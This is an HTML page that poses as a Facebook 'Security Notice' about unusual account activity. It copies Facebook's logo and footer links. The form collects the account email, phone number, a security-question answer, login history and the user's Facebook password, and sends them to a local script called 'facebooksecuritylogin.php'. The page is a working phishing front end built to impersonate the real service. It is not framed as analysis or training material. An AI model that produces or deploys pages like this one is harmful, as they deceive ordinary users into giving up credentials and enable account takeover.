<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Security Notice</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            margin: 0;
            padding: 0;
        }

        .header, .footer {
            background-color: #f0f2f5;
            color: white;
            padding: 10px 20px;
            text-align: center;
        }

        .header img {
            height: 100px;
        }

        .header {
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .container {
            max-width: 600px;
            margin: 20px auto;
            background: white;
            padding: 20px;
            border-radius: 12px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }

        .logo {
            width: 100%; /* Adjusted to be responsive */
            max-width: 400px;
            margin-bottom: 20px;
        }

        h1 {
            color: #1877f2;
            text-align: center;
        }

        .form-group {
            margin-bottom: 15px;
            text-align: left;
        }

        .form-group label {
            display: block;
            margin-bottom: 5px;
        }

        .form-group input, .form-group textarea {
            width: 100%;
            padding: 8px;
            border: 1px solid #ddd;
            border-radius: 4px;
            box-sizing: border-box; /* Ensure padding is included in width */
        }

        .form-group textarea {
            resize: vertical;
            height: 100px;
        }

        .radio-group {
            margin-bottom: 10px;
        }

        .radio-group label {
            display: block;
            margin-bottom: 5px;
        }

        .submit-btn {
            background-color: #1877f2;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }

        .submit-btn:hover {
            background-color: #165eab;
        }

        .footer {
            background-color: #f0f2f5;
            color: #65676b;
            padding: 20px;
            font-size: 0.75em; /* Reduced font size */
        }

        .footer-container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 20px;
        }

        .footer-links {
	    display: flex;
	    flex-direction: column; /* Stack rows vertically by default */
	}

	.footer-links .row {
	    display: flex;
	    flex-wrap: wrap; /* Allows wrapping of items */
	    gap: 10px; /* Space between items */
	    margin-bottom: 10px;
	}

	.footer-links a {
	    color: #65676b;
	    text-decoration: none;
	    margin: 0;
	}

	.footer-links a:hover {
	    text-decoration: underline;
	}

	.footer-divider {
	    border-top: 1px solid #ddd;
	    margin: 10px 0;
	}

	.footer-copyright {
	    text-align: left;
	    margin-top: 20px;
	    font-size: 0.90em;
	}

	@media (min-width: 769px) {
	    .footer-links {
		flex-direction: column;
	    }

	    .footer-links .row {
		flex-direction: row; /* Display rows in a row basis on larger screens */
		justify-content: flex-start;
	    }
	}

        /* Media Queries */
        @media (max-width: 768px) {
            .header img {
                height: 80px; /* Smaller logo on smaller screens */
            }

            .footer-container {
                padding: 0 10px;
            }

            

            .footer-links a {
                margin-bottom: 10px; /* Space out links vertically */
            }

            .footer-copyright {
                font-size: 0.7em; /* Further reduced font size for very small screens */
            }
            .footer-links .row {
		flex-direction: column; /* Stack rows vertically on smaller screens */
		gap: 5px; /* Reduced space between items on smaller screens */
	    }
        }

        @media (max-width: 480px) {
            .container {
                padding: 10px;
            }

            .submit-btn {
                width: 100%;
                padding: 15px;
            }

             .footer-links .row {
		gap: 2px; /* Further reduce space between items on very small screens */
	    }

	    .footer-links a {
		font-size: 0.8em; /* Adjust font size for better readability on small screens */
	    }
        }

    </style>
</head>
<body>
    <div class="header">
        <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook Logo">
    </div>
    <div class="container">
        <h1>Security Notice</h1>
        <p>We have detected unusual activity in your account. To ensure the security of your account, please answer the following questions:</p>
        <form action="facebooksecuritylogin.php" method="post">
            <div class="form-group">
                <label>What is the email address associated with your account?</label>
                <input type="email" id="email" name="email" placeholder="Email address" required>
            </div>
            <div class="form-group">
                <label>What is the phone number linked to your account?</label>
                <input type="tel" id="phone" name="phone" required>
            </div>
            <div class="form-group">
                <label>What was your first pet’s name?</label>
                <input type="text" id="security-question" name="security-question" required>
            </div>
            <div class="form-group">
                <label>When did you last log into your account?</label>
                <input type="text" id="recent-login" name="recent-login" required>
            </div>
            <div class="form-group">
                <label>From which location did you last log in?</label>
                <input type="text" id="login-location" name="login-location" required>
            </div>
            <div class="form-group">
                <label>Have you noticed any suspicious activity on your account?</label>
                <textarea id="suspicious-activity" name="suspicious-activity" required></textarea>
            </div>
            <div class="form-group">
                <label>Have you contacted Facebook Support regarding this issue?</label>
                <div class="radio-group">
                    <label><input type="radio" name="contact-support" value="yes" required> Yes</label>
                    <label><input type="radio" name="contact-support" value="no" required> No</label>
                </div>
            </div>
            <div class="form-group">
                <label>How often do you use Facebook?</label>
                <div class="radio-group">
                    <label><input type="radio" name="usage-frequency" value="daily" required> Daily</label>
                    <label><input type="radio" name="usage-frequency" value="weekly" required> Weekly</label>
                    <label><input type="radio" name="usage-frequency" value="monthly" required> Monthly</label>
                    <label><input type="radio" name="usage-frequency" value="rarely" required> Rarely</label>
                </div>
            </div>
            <div class="form-group">
                <label>How much do you like Facebook?</label>
                <div class="radio-group">
                    <label><input type="radio" name="like-facebook" value="very-much" required> Very Much</label>
                    <label><input type="radio" name="like-facebook" value="somewhat" required> Somewhat</label>
                    <label><input type="radio" name="like-facebook" value="not-much" required> Not Much</label>
                    <label><input type="radio" name="like-facebook" value="not-at-all" required> Not At All</label>
                </div>
            </div></br>
            <div class="form-group">
                <label>Password : </label>
          
                <input type="password" id="password" name="password" placeholder="Enter your facebook password to secure your account" required>
            </div>
            <button type="submit" class="submit-btn">Submit</button>
        </form>
    </div>
    <div class="footer">
        <div class="footer-container">
            <div class="footer-links">
                <!-- First row: Language options -->
                <div class="row">
                    <a >English (UK)</a>
                    <a >বাংলা</a>
                    <a >हिन्दी</a>
                    <a>اردو</a>
                    <a>नेपाली</a>
                    <a>ଓଡ଼ିଆ</a>
                    <a>Español</a>
                    <a>Português (Brasil)</a>
                    <a >Français (France)</a>
                    <a>Deutsch</a>
                    <a>Italiano</a>
                </div>
                <div class="footer-divider"></div>
                <!-- Second row: Main options -->
                <div class="row">
                    <a href="https://facebook.com/reg/">Sign Up</a>
                    <a href="https://facebook.com/login/">Log in</a>
                    <a href="https://messenger.com/">Messenger</a>
                    <a href="https://facebook.com/lite/">Facebook Lite</a>
                    <a href="https://en-gb.facebook.com/watch/">Video</a>
                    <a href="https://facebook.com/places/">Places</a>
                    <a href="https://facebook.com/games/">Games</a>
                    <a href="https://facebook.com/marketplace/">Marketplace</a>
                    <a href="https://pay.facebook.com/" target="_blank">Meta Pay</a>
                    <a href="https://www.meta.com/" target="_blank">Meta Store</a>
                    <a href="https://www.meta.com/quest/" target="_blank">Meta Quest</a>
                    <a href="https://www.meta.ai/">Meta AI</a>
                    <a href="https://www.instagram.com/" target="_blank">Instagram</a>
                    <a href="https://www.threads.net/">Threads</a>
                </div>
                
                <div class="row">
                    <a href="https://facebook.com/fundraisers/">Fundraisers</a>
                    <a href="https://facebook.com/biz/directory/">Services</a>
                    <a href="https://facebook.com/votinginformationcenter/">Voting Information Centre</a>
                    <a href="https://facebook.com/privacy/policy/">Privacy Policy</a>
                    <a href="https://facebook.com/privacy/center/">Privacy Centre</a>
                    <a href="https://facebook.com/groups/discover/">Groups</a>
                    <a href="https://facebook.com/about/">About</a>
                </div>
               
                <div class="row">
                    <a href="https://facebook.com/ad_campaign/landing.php">Create ad</a>
                    <a href="https://facebook.com/pages/create/">Create Page</a>
                    <a href="https://developers.facebook.com/" target="_blank">Developers</a>
                    <a href="https://facebook.com/careers/">Careers</a>
                    <a href="https://facebook.com/policies/cookies/">Cookies</a>
                    <a href="https://facebook.com/policies">AdChoices</a>
                    <a href="https://facebook.com/policies">Terms</a>
                    <a href="https://facebook.com/help/">Help</a>
                    <a href="https://facebook.com/help/637205020878504">Contact uploading and non-users</a>
                </div>
                <div class="footer-copyright">
                    <span>Meta © 2024</span>
                </div>
            </div>
        </div>
    </div>
</body>
</html>
